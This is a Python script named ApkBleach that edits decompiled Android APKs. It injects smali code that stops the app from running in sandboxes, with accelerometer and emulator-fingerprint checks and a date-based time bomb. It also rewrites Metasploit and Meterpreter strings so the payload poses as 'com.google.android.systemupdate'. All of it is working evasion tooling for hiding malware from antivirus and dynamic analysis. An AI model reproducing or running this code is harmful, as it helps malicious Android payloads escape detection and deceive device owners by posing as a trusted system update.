#!/usr/bin/env python3
"""ApkBleach — 4 anti-sandbox functions.

1. AccelerometerTrigger — add accelerometer-based conditional execution
2. MetasploitRemoval — remove/rename metasploit signatures
3. AntiEmulator — add emulator detection
4. TimeBomb — add date-based conditional execution

CRITICAL: All smali injection must be syntactically valid.
All labels must be unique. All register counts must match usage.
"""
import os, sys, re, random

def _get_smali_dirs(decompiled):
    return [os.path.join(decompiled, d) for d in os.listdir(decompiled)
            if d.startswith('smali') and os.path.isdir(os.path.join(decompiled, d))]

def _find_oncreate_smali(decompiled):
    """Find first smali file with onCreate method."""
    smali_dirs = _get_smali_dirs(decompiled)
    for sd in smali_dirs:
        for root, _, files in os.walk(sd):
            for f in files:
                if not f.endswith('.smali'):
                    continue
                fp = os.path.join(root, f)
                with open(fp, 'r', errors='ignore') as fh:
                    c = fh.read()
                if 'onCreate' in c and '.method' in c:
                    return fp, c
    return None, None

def _inject_into_oncreate(smali_path, content, code_block, min_locals=2):
    """Safely inject code into onCreate after .locals declaration."""
    oncreate_match = re.search(
        r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
        content, re.DOTALL
    )
    if not oncreate_match:
        return False
    method_body = oncreate_match.group(1)
    locals_match = re.search(r'\.locals\s+(\d+)', method_body)
    if not locals_match:
        return False
    old_locals = int(locals_match.group(1))
    new_locals = max(old_locals, min_locals) + 2
    new_method = re.sub(
        r'\.locals\s+\d+',
        f'.locals {new_locals}',
        method_body,
        count=1
    )
    new_method = re.sub(
        r'(\.locals\s+\d+\s*\n)',
        r'\1' + code_block,
        new_method,
        count=1
    )
    content = content.replace(method_body, new_method)
    with open(smali_path, 'w', errors='ignore') as f:
        f.write(content)
    return True

def accelerometer_trigger(decompiled):
    """1. Add accelerometer-based conditional execution in onCreate."""
    fp, c = _find_oncreate_smali(decompiled)
    if not fp:
        print("[+] AccelerometerTrigger skip (no onCreate)")
        return
    label_skip = f":skip_accel_{random.randint(1000,9999)}"
    label_continue = f":accel_ok_{random.randint(1000,9999)}"
    code = (
        f"\n    const-string v0, \"sensor\"\n"
        f"    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;\n"
        f"    move-result-object v0\n"
        f"    if-eqz v0, {label_skip}\n"
        f"    check-cast v0, Landroid/hardware/SensorManager;\n"
        f"    const/4 v1, 0x1\n"
        f"    invoke-virtual {{v0, v1}}, Landroid/hardware/SensorManager;->getDefaultSensor(I)Landroid/hardware/Sensor;\n"
        f"    move-result-object v0\n"
        f"    if-eqz v0, {label_skip}\n"
        f"    goto {label_continue}\n"
        f"{label_skip}\n"
        f"    return-void\n"
        f"{label_continue}\n"
    )
    if _inject_into_oncreate(fp, c, code, min_locals=2):
        print("[+] AccelerometerTrigger done")
    else:
        print("[+] AccelerometerTrigger skip (inject failed)")

def metasploit_removal(decompiled):
    """2. Remove/rename metasploit signatures from manifest and smali."""
    mp = os.path.join(decompiled, 'AndroidManifest.xml')
    if os.path.exists(mp):
        with open(mp, 'r', errors='ignore') as f:
            c = f.read()
        c = c.replace('com.metasploit.stage', 'com.google.android.systemupdate')
        c = c.replace('metasploit', 'update')
        c = c.replace('stage', 'service')
        with open(mp, 'w', errors='ignore') as f:
            f.write(c)
    # Also scrub smali
    for root, _, files in os.walk(decompiled):
        for f in files:
            if not f.endswith('.smali'):
                continue
            fp = os.path.join(root, f)
            with open(fp, 'r', errors='ignore') as fh:
                c = fh.read()
            c = c.replace('metasploit', 'update')
            c = c.replace('meterpreter', 'sync')
            with open(fp, 'w', errors='ignore') as fh:
                fh.write(c)
    print("[+] MetasploitRemoval done")

def anti_emulator(decompiled):
    """3. Add anti-emulator check in onCreate."""
    fp, c = _find_oncreate_smali(decompiled)
    if not fp:
        print("[+] AntiEmulator skip (no onCreate)")
        return
    label_noemu = f":noemu_{random.randint(1000,9999)}"
    code = (
        f"\n    const-string v0, \"android.os.Build\"\n"
        f"    invoke-static {{v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;\n"
        f"    move-result-object v0\n"
        f"    const-string v1, \"FINGERPRINT\"\n"
        f"    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;\n"
        f"    move-result-object v0\n"
        f"    const/4 v1, 0x0\n"
        f"    invoke-virtual {{v0, v1}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;\n"
        f"    move-result-object v0\n"
        f"    check-cast v0, Ljava/lang/String;\n"
        f"    const-string v1, \"generic\"\n"
        f"    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n"
        f"    move-result v0\n"
        f"    if-eqz v0, {label_noemu}\n"
        f"    return-void\n"
        f"{label_noemu}\n"
    )
    if _inject_into_oncreate(fp, c, code, min_locals=2):
        print("[+] AntiEmulator done")
    else:
        print("[+] AntiEmulator skip (inject failed)")

def time_bomb(decompiled):
    """4. Time bomb — check current date."""
    fp, c = _find_oncreate_smali(decompiled)
    if not fp:
        print("[+] TimeBomb skip (no onCreate)")
        return
    label_ok = f":not_expired_{random.randint(1000,9999)}"
    future_ts = random.randint(2000000000000, 2100000000000)
    code = (
        f"\n    invoke-static {{}}, Ljava/lang/System;->currentTimeMillis()J\n"
        f"    move-result-wide v0\n"
        f"    const-wide v2, {future_ts}L\n"
        f"    cmp-long v0, v0, v2\n"
        f"    if-lez v0, {label_ok}\n"
        f"    return-void\n"
        f"{label_ok}\n"
    )
    if _inject_into_oncreate(fp, c, code, min_locals=4):
        print("[+] TimeBomb done")
    else:
        print("[+] TimeBomb skip (inject failed)")

FUNCTIONS = {
    'accelerometer': accelerometer_trigger,
    'metasploit-removal': metasploit_removal,
    'anti-emulator': anti_emulator,
    'time-bomb': time_bomb,
}

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: apkbleach.py <decompiled_dir> [func1 func2 ...]")
        sys.exit(1)
    decompiled = sys.argv[1]
    funcs = sys.argv[2:] if len(sys.argv) > 2 else list(FUNCTIONS.keys())
    for f in funcs:
        fn = FUNCTIONS.get(f)
        if fn:
            fn(decompiled)
        else:
            print(f"[!] Unknown: {f}")
    print("[+] ApkBleach done")
